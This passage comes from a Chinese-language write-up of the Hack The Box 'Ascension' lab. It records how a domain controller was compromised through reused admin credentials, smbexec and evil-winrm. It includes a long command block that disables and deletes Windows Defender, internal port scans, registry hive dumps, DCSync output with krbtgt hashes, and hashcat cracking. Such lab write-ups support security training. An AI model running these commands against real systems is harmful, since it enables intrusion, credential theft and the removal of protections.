Key Admins      Security Group - Global Members of this group can perform administrative actions on key objects within the domain.
Max Madders     User
Protected Users Security Group - Global Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
RAS and IAS Servers     Security Group - Domain Local   Servers in this group can access remote access properties of users
Read-only Domain Controllers    Security Group - Global Members of this group are Read-Only Domain Controllers in the domain
Schema Admins   Security Group - Universal      Designated administrators of the schema
```

## netexec
> 确定得到了本地管理员凭据Administrator:kF4df76fj*JfAcf73j
>

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# proxychains -q netexec smb 192.168.10.6 -u Administrator -p kF4df76fj*JfAcf73j --local-auth
SMB         192.168.10.6    445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:DC1) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.10.6    445    DC1              [+] DC1\Administrator:kF4df76fj*JfAcf73j (Pwn3d!)

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# proxychains -q netexec smb 192.168.10.6 -u Administrator -p kF4df76fj*JfAcf73j    
SMB         192.168.10.6    445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.10.6    445    DC1              [-] daedalus.local\Administrator:kF4df76fj*JfAcf73j STATUS_LOGON_FAILURE
```

# dc1/administrator-192.168.10.6
## smbexec
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# proxychains -q smbexec.py 'DC1/Administrator:kF4df76fj*JfAcf73j@192.168.10.6'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

## Getflag
```bash
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
ASCENSION{0G_adm1ni5tR@tor}
```

## 关闭防护
```bash
sc stop WinDefend
sc config WinDefend start= disabled
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -DisableIOAVProtection $true"
powershell -Command "Set-MpPreference -DisableScriptScanning $true"
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\Users\Public'"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v "ForceUpdateFromMU" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter" /v "HideWindowsSecurityNotificationAreaControl" /t REG_DWORD /d 1 /f
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled
Stop-Service -Name WdNisSvc -Force
Set-Service -Name WdNisSvc -StartupType Disabled
Stop-Service -Name wscsvc -Force
Set-Service -Name wscsvc -StartupType Disabled
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 1 /f
icacls "C:\Program Files\Windows Defender" /grant Administrators:F /t
rmdir /s /q "C:\Program Files\Windows Defender"
icacls "C:\ProgramData\Microsoft\Windows Defender" /grant Administrators:F /t
rmdir /s /q "C:\ProgramData\Microsoft\Windows Defender"
```

## 添加用户组
```bash
C:\Windows\system32>net localgroup "Remote Management Users" Administrator /add
The command completed successfully.
```

## 添加hosts
```bash
echo "192.168.10.6 DC1" >> /etc/hosts
```

## evil-winrm
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# proxychains -q evil-winrm -i DC1 -u 'DC1\Administrator' -p 'kF4df76fj*JfAcf73j'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator.DC1\Documents> 
```

## arp扫描
```bash
*Evil-WinRM* PS C:\Users\Administrator.DC1\Documents> 1..255 | ForEach-Object { $ip="192.168.11.$_"; if (Test-Connection $ip -Count 1 -Quiet) { Write-Host "$ip is UP" } }
192.168.11.6 is UP
192.168.11.201 is UP
192.168.11.210 is UP
```

## 域信任
```bash
*Evil-WinRM* PS C:\Users\Administrator.DC1\Documents> nltest /domain_trusts
 
List of domain trusts:
    0: MEGAAIRLINE megaairline.local (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
    1: DAEDALUS daedalus.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully
```

## megaairline.local ip
```bash
*Evil-WinRM* PS C:\Users\Administrator.DC1\Documents> ping megaairline.local

Pinging megaairline.local [192.168.11.201] with 32 bytes of data:
Reply from 192.168.11.201: bytes=32 time<1ms TTL=128
Reply from 192.168.11.201: bytes=32 time<1ms TTL=128
Reply from 192.168.11.201: bytes=32 time<1ms TTL=128
Reply from 192.168.11.201: bytes=32 time<1ms TTL=128

Ping statistics for 192.168.11.201:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

## megaairline.local port
```bash
$ports = @()
1..65535 | ForEach-Object {
    $p = ($_ / 15000) * 100
    Write-Progress -Activity "端口扫描" -Status "尝试连接 $_ 端口" -PercentComplete $p
    $tcp = New-Object System.Net.Sockets.TcpClient
    Try{
        $tcp.Connect("192.168.11.201",$_)
        $ports += $_
        Write-Warning "扫描到在线端口: $_"
        Write-Progress -Activity "端口扫描" -Status "$_ 端口连接成功" -PercentComplete $p
    }
    Catch{
        Write-Progress -Activity "端口扫描" -Status "$_ 端口连接失败" -PercentComplete $p
    }
    Finally{
        $tcp.Close()
    }
}
$ports
Warning: 扫描到在线端口: 53
Warning: 扫描到在线端口: 88
Warning: 扫描到在线端口: 135
Warning: 扫描到在线端口: 139
Warning: 扫描到在线端口: 389
Warning: 扫描到在线端口: 445
Warning: 扫描到在线端口: 464
Warning: 扫描到在线端口: 593
Warning: 扫描到在线端口: 636

```

## 查看监听
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> netstat -an | findstr LISTENING
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49677          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49681          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49694          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:61005          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:63457          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:64467          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:64469          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:64474          0.0.0.0:0              LISTENING
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING
  TCP    192.168.10.6:53        0.0.0.0:0              LISTENING
  TCP    192.168.10.6:139       0.0.0.0:0              LISTENING
  TCP    192.168.11.6:53        0.0.0.0:0              LISTENING
  TCP    192.168.11.6:139       0.0.0.0:0              LISTENING
  TCP    [::]:88                [::]:0                 LISTENING
  TCP    [::]:135               [::]:0                 LISTENING
  TCP    [::]:445               [::]:0                 LISTENING
  TCP    [::]:464               [::]:0                 LISTENING
  TCP    [::]:593               [::]:0                 LISTENING
  TCP    [::]:3389              [::]:0                 LISTENING
  TCP    [::]:5985              [::]:0                 LISTENING
  TCP    [::]:9389              [::]:0                 LISTENING
  TCP    [::]:47001             [::]:0                 LISTENING
  TCP    [::]:49664             [::]:0                 LISTENING
  TCP    [::]:49665             [::]:0                 LISTENING
  TCP    [::]:49666             [::]:0                 LISTENING
  TCP    [::]:49668             [::]:0                 LISTENING
  TCP    [::]:49677             [::]:0                 LISTENING
  TCP    [::]:49678             [::]:0                 LISTENING
  TCP    [::]:49681             [::]:0                 LISTENING
  TCP    [::]:49694             [::]:0                 LISTENING
  TCP    [::]:61005             [::]:0                 LISTENING
  TCP    [::]:63457             [::]:0                 LISTENING
  TCP    [::]:64467             [::]:0                 LISTENING
  TCP    [::]:64469             [::]:0                 LISTENING
  TCP    [::]:64474             [::]:0                 LISTENING
  TCP    [::1]:53               [::]:0                 LISTENING

```

## DCSync
> 拿到了域控的账号密码
>
> DAEDALUS\administrator:pleasefastenyourseatbelts01!
>

### reg转储
```bash
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SECURITY C:\Users\Public\SECURITY

*Evil-WinRM* PS C:\Users\Public> download SAM
*Evil-WinRM* PS C:\Users\Public> download SECURITY
*Evil-WinRM* PS C:\Users\Public> download SYSTEM
```

### 本地dump
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL                
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xad7915b8e6d4f9ee383a5176349739e3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8099db8cb3edeb423199ecfdd672c3a8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
MEGAAIRLINE.LOCAL/Administrator:$DCC2$10240#Administrator#3ea6e70c7142de7e521195f33086a2bf: (2020-10-13 12:53:58+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:174d28e075bd8886547dc92ebd4ba7b125e5cf68dc9088359089ba911b2fd016588a454f902628270f6a24fdb644b83b65f71ad3ed2ca6a3e85dc23cbad9332915ecc4651fa37a41ae74d1d4c4f77cc1936f96407cb9186c67e0b8cc9c492a7b6769d1ce59e4ecdc3e34c57fd0f1aca4ef47c69fc8841e1fe76dd3e58bf1dae9893c72fc4c9e4769dd73f7d047384974b966deb195c1a9a6b58df67274c577bd54f03cf1e91751969581eb17f921d18daf4261a2f694ca897e754c3fa27033913dcdafb5be83ac9a25ecbbb00a5051a7ebeb5f657659a434bafae44de75ecc787a23810e3f35054078a5d2486803f7d7
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:30d01d2d1df2e18564362df88647c2ba
[*] DefaultPassword 
(Unknown User):pleasefastenyourseatbelts01!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xee3ee8172d485d91d928e75a6199a2d9d1552d2a
dpapi_userkey:0x872350e7691cd1f10c04962e21f42f7921a64796
[*] NL$KM 
 0000   4D 9A AB A3 5A 7A 2F 50  25 FC 83 1A 10 FE 1E A5   M...Zz/P%.......
 0010   D3 B9 9D A8 B5 4E EB 60  2B D6 78 53 7B 73 2A E0   .....N.`+.xS{s*.
 0020   44 A8 77 0C 48 36 37 26  80 D0 2C 90 D4 16 AA E5   D.w.H67&..,.....
 0030   66 53 4B 7F A9 2D 50 99  8A 26 0A 20 40 0D 9B E1   fSK..-P..&. @...
NL$KM:4d9aaba35a7a2f5025fc831a10fe1ea5d3b99da8b54eeb602bd678537b732ae044a8770c4836372680d02c90d416aae566534b7fa92d50998a260a20400d9be1
[*] Cleaning up... 
```

### 远程dump
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# proxychains -q impacket-secretsdump DC1/administrator:'kF4df76fj*JfAcf73j'@192.168.10.6
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xad7915b8e6d4f9ee383a5176349739e3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8099db8cb3edeb423199ecfdd672c3a8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
MEGAAIRLINE.LOCAL/Administrator:$DCC2$10240#Administrator#3ea6e70c7142de7e521195f33086a2bf: (2020-10-13 12:53:58+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
DAEDALUS\DC1$:aes256-cts-hmac-sha1-96:96740c181990712e40891b60c6519a37ef5c245d93665dfeb5fd270db5ee29fd
DAEDALUS\DC1$:aes128-cts-hmac-sha1-96:bacb9969c3bc058689377abf98928527
DAEDALUS\DC1$:des-cbc-md5:e65bec68d93e0437
DAEDALUS\DC1$:plain_password_hex:174d28e075bd8886547dc92ebd4ba7b125e5cf68dc9088359089ba911b2fd016588a454f902628270f6a24fdb644b83b65f71ad3ed2ca6a3e85dc23cbad9332915ecc4651fa37a41ae74d1d4c4f77cc1936f96407cb9186c67e0b8cc9c492a7b6769d1ce59e4ecdc3e34c57fd0f1aca4ef47c69fc8841e1fe76dd3e58bf1dae9893c72fc4c9e4769dd73f7d047384974b966deb195c1a9a6b58df67274c577bd54f03cf1e91751969581eb17f921d18daf4261a2f694ca897e754c3fa27033913dcdafb5be83ac9a25ecbbb00a5051a7ebeb5f657659a434bafae44de75ecc787a23810e3f35054078a5d2486803f7d7
DAEDALUS\DC1$:aad3b435b51404eeaad3b435b51404ee:30d01d2d1df2e18564362df88647c2ba:::
[*] DefaultPassword 
DAEDALUS\administrator:pleasefastenyourseatbelts01!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xee3ee8172d485d91d928e75a6199a2d9d1552d2a
dpapi_userkey:0x872350e7691cd1f10c04962e21f42f7921a64796
[*] NL$KM 
 0000   4D 9A AB A3 5A 7A 2F 50  25 FC 83 1A 10 FE 1E A5   M...Zz/P%.......
 0010   D3 B9 9D A8 B5 4E EB 60  2B D6 78 53 7B 73 2A E0   .....N.`+.xS{s*.
 0020   44 A8 77 0C 48 36 37 26  80 D0 2C 90 D4 16 AA E5   D.w.H67&..,.....
 0030   66 53 4B 7F A9 2D 50 99  8A 26 0A 20 40 0D 9B E1   fSK..-P..&. @...
NL$KM:4d9aaba35a7a2f5025fc831a10fe1ea5d3b99da8b54eeb602bd678537b732ae044a8770c4836372680d02c90d416aae566534b7fa92d50998a260a20400d9be1
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a3ff633d308be8e06dbb4e2e88783533:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3e1e73de1f69e094386b8496fdbdaa90:::
daedalus.local\elliot:1112:aad3b435b51404eeaad3b435b51404ee:74fdf381a94e1e446aaedf1757419dcd:::
daedalus.local\svc_backup:1602:aad3b435b51404eeaad3b435b51404ee:f913cd9d773be0d48389d45a20b6364a:::
daedalus.local\billing_user:1603:aad3b435b51404eeaad3b435b51404ee:65043c86ce4386582442450feed8ce53:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:30d01d2d1df2e18564362df88647c2ba:::
WEB01$:1109:aad3b435b51404eeaad3b435b51404ee:093e85c062f53e716ed407796707dc0d:::
MEGAAIRLINE$:1108:aad3b435b51404eeaad3b435b51404ee:5772a64af8664b4f9df65b7663bb1489:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:530f10cb4ac029d2cc6aa28ffcba3a39e794e02b5119243cd67b77eecd92b1e0
Administrator:aes128-cts-hmac-sha1-96:1d331149740fca397eb252f5b88b9e46
Administrator:des-cbc-md5:25200dea6e7ce067
krbtgt:aes256-cts-hmac-sha1-96:ee5a3d3321ee94752eb96a7ff4e8bb82c7d1431e232f0e7d85c45b005499de1b
krbtgt:aes128-cts-hmac-sha1-96:4f4ba7d31e23f80b6cfe122730a7ad63
krbtgt:des-cbc-md5:d6e35bfd1a929ed0
daedalus.local\elliot:aes256-cts-hmac-sha1-96:3ae968c2113dbf0ff1455813d07b8a99f979f2e7bd936e1a9d06b1a9d25cc3a1
daedalus.local\elliot:aes128-cts-hmac-sha1-96:aaf490b3af4f031809aa7273499723c2
daedalus.local\elliot:des-cbc-md5:196df2dc709e5e3b
daedalus.local\svc_backup:aes256-cts-hmac-sha1-96:c88b6ff22e3eefb8b2fbd9242fb196b1e3e1e7c9190ccb7aee8b79aa60207b02
daedalus.local\svc_backup:aes128-cts-hmac-sha1-96:a5c20640e0db1bb828f4900572024cb8
daedalus.local\svc_backup:des-cbc-md5:58bc6708f107cd7a
daedalus.local\billing_user:aes256-cts-hmac-sha1-96:6c71bdd561b9e9405408183ec007c22a4f39b13e1ffc95f1eee141962899254c
daedalus.local\billing_user:aes128-cts-hmac-sha1-96:3cdb110db4d9f3e60dbb2adb47bf18c6
daedalus.local\billing_user:des-cbc-md5:dc7fbfe9685e8586
DC1$:aes256-cts-hmac-sha1-96:96740c181990712e40891b60c6519a37ef5c245d93665dfeb5fd270db5ee29fd
DC1$:aes128-cts-hmac-sha1-96:bacb9969c3bc058689377abf98928527
DC1$:des-cbc-md5:d0cd8f23fe5d86d6
WEB01$:aes256-cts-hmac-sha1-96:c1561e2cc9b658d467c25dd3eb2ddbd1f52a5a484957b87787d7d71fc9ae468c
WEB01$:aes128-cts-hmac-sha1-96:88b47592ef917699f2935574f0dbf02c
WEB01$:des-cbc-md5:f2fe3157a207b901
MEGAAIRLINE$:aes256-cts-hmac-sha1-96:0aca12be0f474820623836a3ee3604c919c24d6542e950b40f000d8af7bb2215
MEGAAIRLINE$:aes128-cts-hmac-sha1-96:28222afba3285066cb876a1b7304b01a
MEGAAIRLINE$:des-cbc-md5:4c58ef2f52205ea1
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

## Hashcat
> 得到凭据elliot\84@m!n@9
>

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# cat hash.txt 
daedalus.local\elliot:1112:aad3b435b51404eeaad3b435b51404ee:74fdf381a94e1e446aaedf1757419dcd:::
                                                                                                        
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

74fdf381a94e1e446aaedf1757419dcd:84@m!n@9                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 74fdf381a94e1e446aaedf1757419dcd
Time.Started.....: Wed Mar 25 17:34:21 2026 (6 secs)
Time.Estimated...: Wed Mar 25 17:34:27 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2055.7 kH/s (0.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11763712/14344385 (82.01%)
Rejected.........: 0/11763712 (0.00%)
Restore.Point....: 11759616/14344385 (81.98%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 851115669 -> 848417
Hardware.Mon.#01.: Util: 16%

Started: Wed Mar 25 17:33:51 2026
Stopped: Wed Mar 25 17:34:28 2026
```

# daedalus\administrator-192.168.10.6
## evil-winrm
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# proxychains -q evil-winrm -i 192.168.10.6 -u 'DAEDALUS\Administrator' -p 'pleasefastenyourseatbelts01!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                           
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## systeminfo
```bash
*Evil-WinRM* PS C:\Users\Administrator.DC1\Documents> systeminfo

Host Name:                 DC1
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA287
Original Install Date:     4/10/2020, 10:48:06 AM
System Boot Time:          3/24/2026, 8:59:29 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume3
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,210 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,697 MB
Virtual Memory: In Use:    2,102 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    daedalus.local
Logon Server:              N/A
Hotfix(s):                 8 Hotfix(s) Installed.
                           [01]: KB5041913
                           [02]: KB4539571
                           [03]: KB4570332
                           [04]: KB4577667
                           [05]: KB4587735
                           [06]: KB4589208
                           [07]: KB5043050
                           [08]: KB5043126
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 5
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.10.6
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.11.6
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

## Sharphound
### upload
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload /usr/share/sharphound/SharpHound.exe
```

### run
```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\SharpHound.exe -c All
2026-03-25T01:24:57.7968932-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-03-25T01:24:57.8282052-07:00|INFORMATION|SharpHound Version: 2.9.0.0
2026-03-25T01:24:57.8282052-07:00|INFORMATION|SharpHound Common Version: 4.5.2.0
2026-03-25T01:24:58.0000398-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-03-25T01:24:58.0313018-07:00|INFORMATION|Initializing SharpHound at 1:24 AM on 3/25/2026
2026-03-25T01:24:58.1094139-07:00|INFORMATION|Resolved current domain to daedalus.local
2026-03-25T01:24:58.3079015-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-03-25T01:24:58.4220767-07:00|INFORMATION|Beginning LDAP search for daedalus.local
2026-03-25T01:24:58.4220767-07:00|INFORMATION|Collecting AdminSDHolder data for daedalus.local
2026-03-25T01:24:58.4845170-07:00|INFORMATION|AdminSDHolder ACL hash C1DB7540904333F6766FD3C57019DBF324DFCF81 calculated for daedalus.local.
2026-03-25T01:24:58.6251414-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.6251414-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.6251414-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.6251414-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.6407708-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.6407708-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.6407708-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.6407708-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.6407708-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.6407708-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.7970157-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8407956-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8550253-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8560281-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8570266-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8590853-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8590853-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8590853-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8590853-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8747311-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
2026-03-25T01:24:58.8747311-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for DAEDALUS.LOCAL
